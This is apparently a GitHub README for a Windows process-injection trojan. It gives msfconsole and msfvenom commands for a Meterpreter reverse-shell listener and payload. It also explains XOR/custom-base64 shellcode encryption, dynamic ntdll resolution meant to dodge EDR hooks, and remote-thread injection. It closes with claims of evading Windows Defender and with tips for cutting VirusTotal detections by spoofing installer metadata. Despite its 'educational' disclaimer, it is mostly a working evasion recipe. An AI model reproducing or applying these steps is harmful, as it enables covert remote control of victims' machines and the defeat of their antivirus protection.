# Native API Remote Process injection Trojan

Remote process injection trojan using Native Api functions (dynamically resolved) and encrypted shellcode, undetected by Windows Defender.
This code is for educational purposes only, do not use it for any malicious or unauthorized activity.


# 💻 Code
This malware calls native api functions usei dynamically resolved function pointers from ntdll.dll, reducing static IAT footprint. So it basically retrieves addresses of native api functions at runtime and uses them to upload shellcode into a target process.

### 1) Listener and encrypted payload

- First i used the classic multi handler exploit to run the payload: 
``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```

- The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its detected way more than the raw shellcode for some reason:
``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 

- Once we have the shellcode we load it into the ```encrypter.c```  file, where the binary data is converted into Base64, use a custom base64_chars set instead of the standard alphabet to obfuscate more, secondly XOR encryption is applied (single-byte key), and finally we convert it into a hexadecimal string. You can find the encrypting code [here](https://github.com/Hue-Jhan/Simple-shellcode-crypter) or you can use your own encryption, but remember not to use rsa or aes or similar encoding algorithms as they are "too perfect" and raise the entropy levels too much.

### 2.1) Native Api:
We get a handle to ntdll and we dynamically resolve its functions, these are the lowest level Win API calls exposed to the user mode, and are the closest interface to the Windows kernel, below them there are just system calls which i will include in the future. Unlike ```kernel32.dll``` APIs like VirtualAllocEx, ```ntdll``` functions are sometimes less likely to be hooked by EDRs at user level.

- In order to use Ntdll we create custom typedef structs for each function, and we define all the internal structures and objects that they need, sometimes structures may be nested and require even more internal objects;
- Then we use ```GetNtFunctionAddress``` function to dynamically retrieve addresses of NT functions from ntdll using ```GetProcAddress```.
- Once we retrieve them, we can call these native NT functions directly and use them to do cool stuff : )

### 2.2) Injector:

The actual injection process works like this:
- First we decode the shellcode by doing the opposite of what we did in the encrypter, make sure to use the same xor key;
- Secondly we find the PID of the target process using GetProcID and we get a handle for it;
- We allocate the memory, write shellcode to the allocated memory, and make it readable, writable, and executable;
- Then we create a new thread in the target process which will execute the shellcode.

Finally we wait for the created thread to finish executing before freeing the memory and the buffers.

# 🛡 AV Detection

<img align="right" src="media/nt-crypt-proc-inj-msfvenom.png" width="350" />

The raw exe file is currently undetected by windows defender but gets blocked by Bitdefender (even the free trial, yes bitdefender is the best av in my opinion, only behind crowdstrike). On virus total it gets 9 detections and as usual virustotal doesn't show bitdefender flagging it.

If i obfuscate the file even more with Resource Hacker by inserting the metadata of another well known software like visual studio code installer, the detections drop to 2 on virus total.

<img align="right" src="media/nt-crypt-proc-inj-msfvenom-reshacked.png" width="350" />
